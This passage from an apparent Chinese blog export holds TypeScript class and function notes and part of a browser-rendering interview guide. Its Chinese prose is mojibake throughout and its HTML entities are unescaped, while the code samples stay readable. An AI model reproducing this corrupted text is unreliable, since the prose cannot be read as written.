å¹¶ä¸”å®ƒä»¬éƒ½æ˜¯æ¥è‡ªåŒä¸€å¤„å£°æ˜Žæ—¶ï¼Œæˆ‘ä»¬æ‰è®¤ä¸ºè¿™ä¸¤ä¸ªç±»åž‹æ˜¯å…¼å®¹çš„ã€‚ å¯¹äºŽprotectedæˆå‘˜ä¹Ÿä½¿ç”¨è¿™ä¸ªè§„åˆ™ã€‚ 123456class Animal &#123; private name: string; constructor(theName: string) &#123; this.name = theName; &#125;&#125;new Animal(&quot;Cat&quot;).name; // é”™è¯¯: &apos;name&apos; æ˜¯ç§æœ‰çš„. å—ä¿æŠ¤protectedprotectedä¿®é¥°ç¬¦ä¸Žprivateä¿®é¥°ç¬¦çš„è¡Œä¸ºå¾ˆç›¸ä¼¼ï¼Œä½†æœ‰ä¸€ç‚¹ä¸åŒï¼Œprotected`æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶å¯ä»¥è®¿é—® 1234567891011121314151617181920class Person &#123; protected name: string; constructor(name: string) &#123; this.name = name; &#125;&#125;class Employee extends Person &#123; private department: string; constructor(name: string, department: string) &#123; super(name) this.department = department; &#125; public getElevatorPitch() &#123; return `Hello, my name is $&#123;this.name&#125; and I work in $&#123;this.department&#125;.`; &#125;&#125;let howard = new Employee(&quot;Howard&quot;, &quot;Sales&quot;);console.log(howard.getElevatorPitch());console.log(howard.name); // é”™è¯¯ åªè¯»readonlyä½ å¯ä»¥ä½¿ç”¨readonlyå…³é”®å­—å°†å±žæ€§è®¾ç½®ä¸ºåªè¯»çš„ã€‚ åªè¯»å±žæ€§å¿…é¡»åœ¨å£°æ˜Žæ—¶æˆ–æž„é€ å‡½æ•°é‡Œè¢«åˆå§‹åŒ–ã€‚ å‡½æ•°å‡½æ•°çš„å®Œæ•´ç±»åž‹ 12let myAdd: (x:number, y:number) =&gt; number = function(x: number, y: number): number &#123; return x + y; &#125;; åªè¦å‚æ•°ç±»åž‹æ˜¯åŒ¹é…çš„ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºå®ƒæ˜¯æœ‰æ•ˆçš„å‡½æ•°ç±»åž‹ï¼Œè€Œä¸åœ¨ä¹Žå‚æ•°åæ˜¯å¦æ­£ç¡®ï¼Œå‚æ•°åæ—ä½¿ç”¨?å®žçŽ°å¯é€‰å‚æ•°ã€‚lastName = â€œSmithâ€ æŠŠlast nameçš„é»˜è®¤å€¼è®¾ç½®ä¸º&quot;Smith&quot;ã€‚ åœ¨å‡½æ•°å’Œè¿”å›žå€¼ç±»åž‹ä¹‹å‰ä½¿ç”¨(=&gt;)ç¬¦å·ï¼Œä½¿ä¹‹æ¸…æ™°æ˜Žäº†ã€‚å¦‚æžœå‡½æ•°æ²¡æœ‰è¿”å›žä»»ä½•å€¼ï¼Œä¹Ÿå¿…é¡»æŒ‡å®šè¿”å›žå€¼ç±»åž‹ä¸ºvoidè€Œä¸èƒ½ç•™ç©ºã€‚ thisåŒ¿åå‡½æ•°this12345678910111213141516171819202122interface Card &#123; suit: string; card: number;&#125;interface Deck &#123; suits: string[]; cards: number[]; createCardPicker(this: Deck): () =&gt; Card;&#125;let deck: Deck = &#123; suits: ["hearts", "spades", "clubs", "diamonds"], cards: Array(52), // NOTE: The function now explicitly specifies that its callee must be of type Deck createCardPicker: function(this: Deck) &#123;//ä¸æŒ‡å®šthisä¸ºany return () =&gt; &#123; //ç®­å¤´å‡½æ•°èƒ½ä¿å­˜å‡½æ•°åˆ›å»ºæ—¶çš„`this`å€¼ï¼Œè€Œä¸æ˜¯è°ƒç”¨æ—¶çš„å€¼ã€‚è¿™é‡Œæ˜¯Deckï¼›å¦‚æžœæ˜¯function()&#123; this å¾€å¾€æŠ¥é”™ï¼Œä¸ºwindowæˆ–undefined let pickedCard = Math.floor(Math.random() * 52); let pickedSuit = Math.floor(pickedCard / 13); return &#123;suit: this.suits[pickedSuit], card: pickedCard % 13&#125;; &#125; &#125;&#125; å›žè°ƒå‡½æ•°thiså½“ä½ å°†ä¸€ä¸ªå‡½æ•°ä¼ é€’åˆ°æŸä¸ªåº“å‡½æ•°é‡Œåœ¨ç¨åŽè¢«è°ƒç”¨æ—¶ï¼Œä½ å¯èƒ½ä¹Ÿè§åˆ°è¿‡å›žè°ƒå‡½æ•°é‡Œçš„thisä¼šæŠ¥é”™ã€‚ å› ä¸ºå½“å›žè°ƒå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šè¢«å½“æˆä¸€ä¸ªæ™®é€šå‡½æ•°è°ƒç”¨ï¼Œthiså°†ä¸ºundefinedã€‚ ç¨åšæ”¹åŠ¨ï¼Œä½ å°±å¯ä»¥é€šè¿‡thiså‚æ•°æ¥é¿å…é”™è¯¯ã€‚ é¦–å…ˆï¼Œåº“å‡½æ•°çš„ä½œè€…è¦æŒ‡å®šthisçš„ç±»åž‹ï¼š 123interface UIElement &#123; addClickListener(onclick: (this: void, e: Event) =&gt; void): void;&#125; this: voidæ„å‘³ç€addClickListeneræœŸæœ›onclickæ˜¯ä¸€ä¸ªå‡½æ•°ä¸”å®ƒä¸éœ€è¦ä¸€ä¸ªthisç±»åž‹ã€‚ ç„¶åŽï¼Œä¸ºè°ƒç”¨ä»£ç é‡Œçš„thisæ·»åŠ ç±»åž‹æ³¨è§£ï¼š 123456789class Handler &#123; info: string; onClickBad(this: Handler, e: Event) &#123; // oops, used this here. using this callback would crash at runtime this.info = e.message; &#125;&#125;let h = new Handler();uiElement.addClickListener(h.onClickBad); // error! æŒ‡å®šäº†thisç±»åž‹åŽï¼Œä½ æ˜¾å¼å£°æ˜ŽonClickBadå¿…é¡»åœ¨Handlerçš„å®žä¾‹ä¸Šè°ƒç”¨ã€‚ ç„¶åŽTypeScriptä¼šæ£€æµ‹åˆ°addClickListenerè¦æ±‚å‡½æ•°å¸¦æœ‰this: voidã€‚ æ”¹å˜thisç±»åž‹æ¥ä¿®å¤è¿™ä¸ªé”™è¯¯ï¼š 123456789class Handler &#123; info: string; onClickGood(this: void, e: Event) &#123; // can't use this here because it's of type void! console.log('clicked!'); &#125;&#125;let h = new Handler();uiElement.addClickListener(h.onClickGood); å› ä¸ºonClickGoodæŒ‡å®šäº†thisç±»åž‹ä¸ºvoidï¼Œå› æ­¤ä¼ é€’addClickListeneræ˜¯åˆæ³•çš„ã€‚ å½“ç„¶äº†ï¼Œè¿™ä¹Ÿæ„å‘³ç€ä¸èƒ½ä½¿ç”¨this.info. å¦‚æžœä½ ä¸¤è€…éƒ½æƒ³è¦ï¼Œä½ ä¸å¾—ä¸ä½¿ç”¨ç®­å¤´å‡½æ•°äº†ï¼š 1234class Handler &#123; info: string; onClickGood = (e: Event) =&gt; &#123; this.info = e.message &#125;&#125; è¿™æ˜¯å¯è¡Œçš„å› ä¸ºç®­å¤´å‡½æ•°ä½¿ç”¨å¤–å±‚çš„thisï¼Œæ‰€ä»¥ä½ æ€»æ˜¯å¯ä»¥æŠŠå®ƒä»¬ä¼ ç»™æœŸæœ›this: voidçš„å‡½æ•°ã€‚ ç¼ºç‚¹æ˜¯æ¯ä¸ªHandlerå¯¹è±¡éƒ½ä¼šåˆ›å»ºä¸€ä¸ªç®­å¤´å‡½æ•°ã€‚ å¦ä¸€æ–¹é¢ï¼Œæ–¹æ³•åªä¼šè¢«åˆ›å»ºä¸€æ¬¡ï¼Œæ·»åŠ åˆ°Handlerçš„åŽŸåž‹é“¾ä¸Šã€‚ å®ƒä»¬åœ¨ä¸åŒHandlerå¯¹è±¡é—´æ˜¯å…±äº«çš„ã€‚ é‡è½½åŒä¸€ä¸ªå‡½æ•°æä¾›å¤šä¸ªå‡½æ•°ç±»åž‹å®šä¹‰æ¥è¿›è¡Œå‡½æ•°é‡è½½ å¯¹è±¡å¯¹è±¡çš„å±•å¼€ä¸Žå‰©ä½™è¿ç®—ç¬¦TypeScript 2.1 å¸¦æ¥äº†å¯¹ ES2017 å±•å¼€ä¸Žå‰©ä½™è¿ç®—ç¬¦çš„æ”¯æŒ. å’Œæ•°ç»„çš„å±•å¼€ç±»ä¼¼, å±•å¼€ä¸€ä¸ªå¯¹è±¡å¯ä»¥å¾ˆæ–¹ä¾¿åœ°èŽ·å¾—å®ƒçš„æµ…æ‹·è´: 1let copy = &#123; ...original &#125;; ç›¸ä¼¼çš„, ä½ å¯ä»¥åˆå¹¶å¤šä¸ªä¸åŒçš„å¯¹è±¡. åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­, merged ä¼šæœ‰æ¥è‡ª foo, bar å’Œ baz çš„å±žæ€§. 1let merged = &#123; ...foo, ...bar, ...baz &#125;; ä½ ä¹Ÿå¯ä»¥è¦†ç›–å·²æœ‰çš„å±žæ€§å’Œæ·»åŠ æ–°çš„å±žæ€§: 12let obj = &#123; x: 1, y: "string" &#125;;var newObj = &#123;...obj, z: 3, y: 4&#125;; // &#123; x: number, y: number, z: number &#125; æŒ‡å®šå±•å¼€æ“ä½œçš„é¡ºåºå†³å®šäº†é‚£äº›å±žæ€§çš„å€¼ä¼šç•™åœ¨åˆ›å»ºçš„å¯¹è±¡é‡Œ; åœ¨é åŽçš„å±•å¼€ä¸­å‡ºçŽ°çš„å±žæ€§ä¼š â€œæˆ˜èƒœâ€ ä¹‹å‰åˆ›å»ºçš„å±žæ€§. å¯¹è±¡çš„å‰©ä½™æ“ä½œå’Œå¯¹è±¡çš„å±•å¼€æ˜¯å¯¹åº”çš„, è¿™æ ·ä¸€æ¥æˆ‘ä»¬å¯ä»¥å¯¼å‡ºè§£æž„ä¸€ä¸ªå…ƒç´ æ—¶è¢«æ¼æŽ‰çš„å…¶ä»–å±žæ€§. 123let obj = &#123; x: 1, y: 1, z: 1 &#125;;let &#123; z, ...obj1 &#125; = obj;obj1; // &#123;x: number, y: number&#125;; å£°æ˜Žhttp://json.schemastore.org/tsconfig https://legacy.gitbook.com/book/zhongsp/typescript-handbook/details http://www.typescriptlang.org/ https://ts.xcatliu.com/ https://zhuanlan.zhihu.com/p/24267683 https://zhuanlan.zhihu.com/p/58517848 https://zhuanlan.zhihu.com/p/66624970 https://zhuanlan.zhihu.com/p/39620591 https://zhuanlan.zhihu.com/p/64423022 https://zhuanlan.zhihu.com/p/40311981]]></content>
      <categories>
        <category>Typescript</category>
      </categories>
      <tags>
        <tag>Typescript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å­¦ä¹ æŒ‡å—_æµè§ˆå™¨]]></title>
    <url>%2F2019%2F06%2F03%2Finterview_browser%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å‰ç«¯é¢è¯•æŒ‡å—_æµè§ˆå™¨æµè§ˆå™¨ç»„æˆä¸»æµæµè§ˆå™¨ï¼šInternet Explorerã€Firefoxã€Safariã€Chrome æµè§ˆå™¨å’Œ Operaæµè§ˆå™¨çš„ä¸»è¦ç»„ä»¶ä¸ºï¼š ç”¨æˆ·ç•Œé¢ - é™¤äº†æµè§ˆå™¨ä¸»çª—å£æ˜¾ç¤ºçš„é¡µé¢å¤–ï¼Œå…¶ä»–çš„éƒ¨åˆ†ï¼ŒåŒ…æ‹¬åœ°å€æ ã€å‰è¿›/åŽé€€æŒ‰é’®ã€ä¹¦ç­¾èœå•ç­‰ã€‚ æµè§ˆå™¨å¼•æ“Ž - åœ¨ç”¨æˆ·ç•Œé¢å’Œæ¸²æŸ“å¼•æ“Žä¹‹é—´ä¼ é€æŒ‡ä»¤ã€‚ æ¸²æŸ“å¼•æ“Ž - è´Ÿè´£æ˜¾ç¤ºè¯·æ±‚çš„å†…å®¹ï¼Œè´Ÿè´£è§£æž HTML å’Œ CSSï¼Œå¹¶å°†è§£æžåŽçš„å†…å®¹æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚Firefox-Geckoï¼ŒSafariå’ŒChrome-WebKit ç½‘ç»œ - ç”¨äºŽç½‘ç»œè°ƒç”¨ï¼Œæ¯”å¦‚ HTTP è¯·æ±‚ã€‚å…¶æŽ¥å£ä¸Žå¹³å°æ— å…³ï¼Œå¹¶ä¸ºæ‰€æœ‰å¹³å°æä¾›åº•å±‚å®žçŽ°ã€‚ ç”¨æˆ·ç•Œé¢åŽç«¯ - ç”¨äºŽç»˜åˆ¶åŸºæœ¬çš„çª—å£å°éƒ¨ä»¶ã€‚å…¶å…¬å¼€äº†ä¸Žå¹³å°æ— å…³çš„é€šç”¨æŽ¥å£ï¼Œè€Œåœ¨åº•å±‚ä½¿ç”¨æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢æ–¹æ³•ã€‚ JavaScript è§£é‡Šå™¨ã€‚ç”¨äºŽè§£æžå’Œæ‰§è¡Œ JavaScript ä»£ç ã€‚ æ•°æ®å­˜å‚¨ã€‚è¿™æ˜¯æŒä¹…å±‚ã€‚æµè§ˆå™¨éœ€è¦åœ¨ç¡¬ç›˜ä¸Šä¿å­˜å„ç§æ•°æ®ï¼Œä¾‹å¦‚ Cookieã€‚æ–°çš„ HTML è§„èŒƒ (HTML5) å®šä¹‰äº†â€œç½‘ç»œæ•°æ®åº“â€ï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´ï¼ˆä½†æ˜¯è½»ä¾¿ï¼‰çš„æµè§ˆå™¨å†…æ•°æ®åº“ã€‚å†…æ ¸ æµè§ˆå™¨ æ¸²æŸ“å¼•æ“Ž JSè§£é‡Šå™¨ Chrome WebKit-&gt;Blink(2013)ã€ V8 Firefox Gecko SpiderMonkey Safari Webkit Nitro Edge EdgeHTML-&gt;Chromium(Blink) Chakra Opera Presto-&gt;Blink V8 IE Trident Chakra å…¶ä»–æµè§ˆå™¨360æµè§ˆå™¨ã€çŒŽè±¹æµè§ˆå™¨å†…æ ¸ï¼šIE+ChromeåŒå†…æ ¸ï¼› æœç‹—ã€é¨æ¸¸ã€QQæµè§ˆå™¨å†…æ ¸ï¼šTridentï¼ˆå…¼å®¹æ¨¡å¼ï¼‰+Webkitï¼ˆé«˜é€Ÿæ¨¡å¼ï¼‰ï¼› ç™¾åº¦æµè§ˆå™¨ã€ä¸–ç•Œä¹‹çª—å†…æ ¸ï¼šIEå†…æ ¸ï¼› 2345æµè§ˆå™¨å†…æ ¸ï¼šå¥½åƒä»¥å‰æ˜¯IEå†…æ ¸ï¼ŒçŽ°åœ¨ä¹Ÿæ˜¯IE+ChromeåŒå†…æ ¸äº†ï¼› UCæµè§ˆå™¨å†…æ ¸ï¼šè¿™ä¸ªä¼—å£ä¸ä¸€ï¼ŒUCè¯´æ˜¯ä»–ä»¬è‡ªå·±ç ”å‘çš„U3å†…æ ¸ï¼Œä½†å¥½åƒè¿˜æ˜¯åŸºäºŽWebkitå’ŒTridentï¼Œè¿˜æœ‰è¯´æ˜¯åŸºäºŽç«ç‹å†…æ ¸ã€‚ äº‹ä»¶å¾ªçŽ¯æµè§ˆå™¨çŽ¯å¢ƒä¸‹ï¼Œmicrotask çš„ä»»åŠ¡é˜Ÿåˆ—æ˜¯æ¯ä¸ª macrotask æ‰§è¡Œå®Œä¹‹åŽæ‰§è¡Œã€‚è€Œåœ¨ Node.js ä¸­ï¼Œmicrotask ä¼šåœ¨äº‹ä»¶å¾ªçŽ¯çš„å„ä¸ªé˜¶æ®µä¹‹é—´æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªé˜¶æ®µæ‰§è¡Œå®Œæ¯•ï¼Œå°±ä¼šåŽ»æ‰§è¡Œ microtask é˜Ÿåˆ—çš„ä»»åŠ¡ã€‚ ç»¼åˆè¾“å…¥URLåˆ¤æ–­ åè®® ç¼“å­˜ è¾“å…¥çš„æ˜¯ URL è¿˜æ˜¯ queryåŸŸåè§£æžDNS æŸ¥è¯¢ï¼šé¡ºåºæµè§ˆå™¨ç¼“å­˜-&gt;ç³»ç»Ÿç¼“å­˜-&gt;è·¯ç”±å™¨ç¼“å­˜-&gt;è¿è¥å•†ç¼“å­˜-&gt;åŸŸåé€’å½’æœç´¢ å»ºç«‹è¿žæŽ¥HTTPS TCPä¸‰æ¡å››æŒ¥ å‘é€è¯·æ±‚ æŽ¥å—å“åº” æ¸²æŸ“é¡µé¢ æ¸²æŸ“1.åŠ è½½ å½“è¯·æ±‚å“åº”è¿”å›žçš„æ—¶å€™ï¼Œnetwork thread ä¼šä¾æ® Content-TypeåŠ MIME Type sniffing åˆ¤æ–­å“åº”å†…å®¹çš„æ ¼å¼ åŠ è½½è¿‡ç¨‹è´¼å¤æ‚ï¼Œéœ€è¦åŠ è½½å„ç§èµ„æºï¼Œæ¯”å¦‚htmlã€cssã€jsæˆ–è€…pdfç­‰ç­‰ã€‚è¿™é‡Œåˆå¯ä»¥åˆ†æˆä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯å†…å®¹åŠ è½½ï¼Œæ¯”å¦‚éœ€è¦æ‰“å¼€ä¸€ä¸ªæ–°è¿›ç¨‹ã€éœ€è¦æ‰“å¼€ä¿å­˜å¼¹çª—æˆ–è€…éœ€è¦ç›´æŽ¥åŠ è½½å†…å®¹ï¼›å¦ä¸€ç§åˆ™æ˜¯å­èµ„æºä¸‹è½½ï¼Œæ¯”å¦‚cssã€jsã€å›¾ç‰‡ç­‰ç­‰ï¼Œè¿™é‡Œåˆä¼šæ¶‰åŠåˆ°ç¼“å­˜ï¼Œé€‰æ‹©æœ¬åœ°è¯»å–è¿˜æ˜¯åŽ»æœåŠ¡å™¨è¯·æ±‚ç­‰ç­‰ä¸€ç³»åˆ—çš„é—®é¢˜ã€‚ å¦‚æžœåŸŸåæˆ–è€…è¯·æ±‚å†…å®¹åŒ¹é…åˆ°å·²çŸ¥çš„æ¶æ„ç«™ç‚¹ï¼Œnetwork thread ä¼šå±•ç¤ºä¸€ä¸ªè­¦å‘Šé¡µã€‚æ­¤å¤– CORB æ£€æµ‹ä¹Ÿä¼šè§¦å‘ç¡®ä¿æ•æ„Ÿæ•°æ®ä¸ä¼šè¢«ä¼ é€’ç»™æ¸²æŸ“è¿›ç¨‹ 2.è§£æž è§£æžè¿‡ç¨‹å°±å°±æ˜¯è§£æžä¸Šé¢åŠ è½½çš„æ–‡ä»¶ï¼ˆHTMLï¼‰ï¼Œå»ºç«‹DOMæ ‘çš„è¿‡ç¨‹ï¼Œ é™¤äº†è§£æžHTMLç”ŸæˆDOMæ ‘ï¼Œä¸ºäº†æé«˜æ€§èƒ½ï¼Œä¸€èˆ¬æµè§ˆå™¨éƒ½ä¼šåšä¸€äº›é¢„å¤„ç†åŠ¨ä½œï¼Œæ¯”å¦‚ï¼šDNSé¢„èŽ·å–ã€é¢„åŠ è½½æ‰«æä»¥åŠå®‰å…¨æ‰«æ(é˜²XSS)ç­‰ç­‰ã€‚ DNSçš„é¢„èŽ·å–åœ¨å‰é¢å°±é¡ºå¸¦æåˆ°äº†ï¼Œé¢„èŽ·å–è¿‡ç¨‹å°±åœ¨è¿™é‡Œå‘ç”Ÿçš„ã€‚å¤§å®¶å¯ä»¥å›žåˆ°1688é¦–é¡µå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä¸€æ®µä»£ç ç‰‡ï¼š12345678&lt;!--dnsé¢„è§£æž--&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cbu01.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//img.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//astyle-src.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//g.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//dcms.1688.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//gm.mmstat.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//log.mmstat.com&quot; /&gt; è¿™æ®µä»£ç ç‰‡æ²¡æœ‰ä»»ä½•é€»è¾‘åŠŸèƒ½ï¼Œå”¯ä¸€çš„ä½œç”¨å°±æ˜¯ä¸»åŠ¨å‘Šè¯‰æµè§ˆå™¨ï¼Œèµ¶ç´§åŽ»è¯·æ±‚è§£æžè¿™äº›åŸŸåï¼Œæˆ‘é©¬ä¸Šè¦ç”¨äº†ï¼Œè¿™æ ·å¯ä»¥æžå¤§åœ°ç¼©å‡dnsçš„è§£æžæ—¶é—´ã€‚æœ‰äººå¯èƒ½æ€€ç–‘ï¼Œæ”¾åœ¨å¤´éƒ¨ï¼Œéš¾é“ä¸ä¼šé˜»å¡žé¡µé¢åŠ è½½ï¼Ÿå®žé™…ä¸Šå¹¶ä¸ä¼šï¼ŒæŸ¥äº†ä¸€ä¸‹Chromeçš„æ–‡æ¡£ï¼Œè¿™çŽ©æ„ç”šè‡³éƒ½æ²¡æœ‰ç”¨æµè§ˆå™¨çš„ç½‘ç»œæ ˆã€‚Chromeä¼šå¯åŠ¨8ä¸ªå¼‚æ­¥çº¿ç¨‹ï¼Œå•¥éƒ½ä¸å¹²ï¼Œå°±è¹²åœ¨é‚£é‡Œç­‰æµè§ˆå™¨ç»™ä»–ä¸¢ä»»åŠ¡ï¼ˆé˜Ÿåˆ—ï¼‰ï¼Œç„¶åŽåŽ»æ‰¾æ“ä½œç³»ç»Ÿè¦è§£æžï¼Œè¿™ä¸ªè¿‡ç¨‹å”¯ä¸€çš„ä½œç”¨å°±æ˜¯æå‰è§¦å‘DNSè§£æžï¼ŒåŽé¢å†æ¥çš„æ—¶å€™å°±ç›´æŽ¥èµ°ç¼“å­˜äº†ï¼Œå®žé™…ä¸Šè¿™8ä¸ªçº¿ç¨‹åªæ˜¯ä¸‹ä¸ªä»»åŠ¡ç½¢äº†ã€‚é™¤äº†ä¸Šé¢è¿™ç§å†™æ³•æ¥è§¦å‘DNSçš„é¢„èŽ·å–ï¼Œå®žé™…æµè§ˆå™¨è¿˜ä¼šæžä¸ªçº¿ç¨‹åŽ»æ‰«æhtmlæ–‡ä»¶ï¼Œçœ‹åˆ°åŸŸåä»¥åŽä¹Ÿä¼šä¸¢ç»™ä¸Šé¢é‚£8ä¸ªçº¿ç¨‹ã€‚ 3.æž„å»ºDOMæ ‘ DOMæœ¬èº«æ²¡æœ‰ä»»ä½•æ¸²æŸ“èƒ½åŠ›ï¼Œæˆ‘ä»¬æ¸²æŸ“çš„ä¹Ÿä¸æ˜¯DOMã€‚webkitä¼šä¸ºDOMæ ‘å»ºç«‹ä¸€å †æ¸²æŸ“æ ‘ï¼Œè¿™äº›æ¸²æŸ“æ ‘å†ç”¨äºŽæ¸²æŸ“ã€‚ æ¸²æŸ“æ ‘æ˜¯å½’å±žäºŽDOMæ ‘çš„ã€‚æ¸²æŸ“æ ‘æ˜¯åªå­˜åœ¨äºŽä¸Šä¸‹æ–‡ä¸­ï¼Œä¸Šä¸‹æ–‡ç»“æŸï¼Œæ ‘é”€æ¯ï¼›ä¸‹æ¬¡å†æ¬¡æ¸²æŸ“ï¼Œå†æ–°å»ºä¸€ä¸ªæ¸²æŸ“æ ‘ã€‚æ¸²æŸ“æ ‘åŒ…å«äº†æ¸²æŸ“éœ€è¦çš„ä¸€åˆ‡ä¿¡æ¯ã€‚æ¸²æŸ“æ ‘çš„èŠ‚ç‚¹ä¼šæœ‰ä¸åŒç§ç±»ï¼Œä¸‹é¢æ˜¯å‡ ç§å¸¸è§çš„ï¼ˆéƒ½æ˜¯ä»Žä¸€ä¸ªåŸºç±»ç»§æ‰¿å‡ºæ¥çš„ï¼‰ï¼Œè¿™äº›ç±»éƒ½æœ‰è‡ªå·±çš„æ¸²æŸ“æ–¹æ³•ï¼Œä½ åªéœ€è¦å‘Šè¯‰å®ƒï¼Œè¯¥ä½ å‡ºåœºäº†ï¼Œä»–ä»¬è‡ªå·±å°±æœ‰æ–¹æ³•åŽ»æŠŠè‡ªå·±ç”»å¥½è§£æžhtmlï¼Œç”Ÿæˆä¸€ä¸ªDOMæ ‘ï¼Œè§£æžè¿‡ç¨‹ä¸­é‡åˆ°äº†scriptæ ‡ç­¾å°±ä¼šæ‰§è¡Œï¼Œæ³¨æ„çš„æ˜¯ï¼Œæ‰§è¡Œjsä¼šé˜»å¡žDOMçš„è§£æžï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆéƒ½æå€¡æŠŠä¸é‡è¦çš„ä»£ç æ”¾åˆ°bodyçš„æœ€åŽé¢æ¥æ‰§è¡Œã€‚ å¦‚æžœæœ‰äº›ä»£ç ç¡®å®žéœ€è¦æ”¾åœ¨é å‰çš„ä½ç½®ï¼Œå¯ä»¥å†™è€ƒè™‘å†™æˆå¼‚æ­¥çš„æ–¹å¼æ¥é¿å…é˜»å¡žé¡µé¢æ¸²æŸ“ã€‚æ–°æµè§ˆå™¨ä¸€èˆ¬éƒ½æ”¯æŒäº†deferå’Œasyncå±žæ€§ï¼Œå…¶ä¸­deferå±žæ€§çš„scriptçš„ä¸‹è½½ä¸ä¼šé˜»å¡žhtmlè§£æžï¼Œè€Œä¸”å…¶ä¼šåœ¨è§£æžå®ŒæˆåŽæ‰æ‰§è¡Œï¼›asyncå±žæ€§åˆ™æ˜¯ä¸‹è½½ä¸ä¼šé˜»å¡žhtmlè§£æžï¼Œä½†æ˜¯æ‰§è¡Œè¿˜æ˜¯ä¼šé˜»å¡žã€‚è¿™æ˜¯å› ä¸ºJavaScriptä¸åªæ˜¯å¯ä»¥æ”¹DOMï¼Œå®ƒè¿˜å¯ä»¥æ›´æ”¹æ ·å¼ï¼Œä¹Ÿå°±æ˜¯å®ƒå¯ä»¥æ›´æ”¹CSSOMã€‚å‰é¢æˆ‘ä»¬ä»‹ç»ï¼Œä¸å®Œæ•´çš„CSSOMæ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œä½†JavaScriptä¸­æƒ³è®¿é—®CSSOMå¹¶æ›´æ”¹å®ƒï¼Œé‚£ä¹ˆåœ¨æ‰§è¡ŒJavaScriptæ—¶ï¼Œå¿…é¡»è¦èƒ½æ‹¿åˆ°å®Œæ•´çš„CSSOMã€‚æ‰€ä»¥å°±å¯¼è‡´äº†ä¸€ä¸ªçŽ°è±¡ï¼Œå¦‚æžœæµè§ˆå™¨å°šæœªå®ŒæˆCSSOMçš„ä¸‹è½½å’Œæž„å»ºï¼Œè€Œæˆ‘ä»¬å´æƒ³åœ¨æ­¤æ—¶è¿è¡Œè„šæœ¬ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°†å»¶è¿Ÿè„šæœ¬æ‰§è¡Œå’ŒDOMæž„å»ºï¼Œç›´è‡³å…¶å®ŒæˆCSSOMçš„ä¸‹è½½å’Œæž„å»ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šå…ˆä¸‹è½½å’Œæž„å»ºCSSOMï¼Œç„¶åŽå†æ‰§è¡ŒJavaScriptï¼Œæœ€åŽåœ¨ç»§ç»­æž„å»ºDOMã€‚ 4.åŠ è½½æ¬¡çº§çš„èµ„æºç½‘é¡µä¸­å¸¸å¸¸åŒ…å«è¯¸å¦‚å›¾ç‰‡ï¼ŒCSSï¼ŒJS ç­‰é¢å¤–çš„èµ„æºï¼Œè¿™äº›èµ„æºéœ€è¦ä»Žç½‘ç»œä¸Šæˆ–è€… cache ä¸­èŽ·å–ã€‚ä¸»è¿›ç¨‹å¯ä»¥åœ¨æž„å»º DOM çš„è¿‡ç¨‹ä¸­ä¼šé€ä¸€è¯·æ±‚å®ƒä»¬ï¼Œä¸ºäº†åŠ é€Ÿ preload scanner ä¼šåŒæ—¶è¿è¡Œï¼Œå¦‚æžœåœ¨ html ä¸­å­˜åœ¨ &lt;img&gt; &lt;link&gt; ç­‰æ ‡ç­¾ï¼Œpreload scanner ä¼šæŠŠè¿™äº›è¯·æ±‚ä¼ é€’ç»™ Browser process ä¸­çš„ network thread è¿›è¡Œç›¸å…³èµ„æºçš„ä¸‹è½½ã€‚ 5.æ ·å¼è®¡ç®—è¿›ç¨‹è¿˜ä¼šåŸºäºŽ CSS é€‰æ‹©å™¨è§£æž CSS èŽ·å–æ¯ä¸€ä¸ªèŠ‚ç‚¹çš„æœ€ç»ˆçš„è®¡ç®—æ ·å¼å€¼ã€‚å³ä½¿ä¸æä¾›ä»»ä½• CSSï¼Œæµè§ˆå™¨å¯¹æ¯ä¸ªå…ƒç´ ä¹Ÿä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„æ ·å¼ 6.èŽ·å–å¸ƒå±€ æƒ³è¦æ¸²æŸ“ä¸€ä¸ªå®Œæ•´çš„é¡µé¢ï¼Œé™¤äº†èŽ·çŸ¥æ¯ä¸ªèŠ‚ç‚¹çš„å…·ä½“æ ·å¼ï¼Œè¿˜éœ€è¦èŽ·çŸ¥æ¯ä¸€ä¸ªèŠ‚ç‚¹åœ¨é¡µé¢ä¸Šçš„ä½ç½®ï¼Œå¸ƒå±€å…¶å®žæ˜¯æ‰¾åˆ°æ‰€æœ‰å…ƒç´ çš„å‡ ä½•å…³ç³»çš„è¿‡ç¨‹ã€‚å…¶å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š é€šè¿‡éåŽ† DOM åŠç›¸å…³å…ƒç´ çš„è®¡ç®—æ ·å¼ï¼Œä¸»çº¿ç¨‹ä¼šæž„å»ºå‡ºåŒ…å«æ¯ä¸ªå…ƒç´ çš„åæ ‡ä¿¡æ¯åŠç›’å­å¤§å°çš„å¸ƒå±€æ ‘ã€‚å¸ƒå±€æ ‘å’Œ DOM æ ‘ç±»ä¼¼ï¼Œä½†æ˜¯å…¶ä¸­åªåŒ…å«é¡µé¢å¯è§çš„å…ƒç´ ï¼Œå¦‚æžœä¸€ä¸ªå…ƒç´ è®¾ç½®äº† 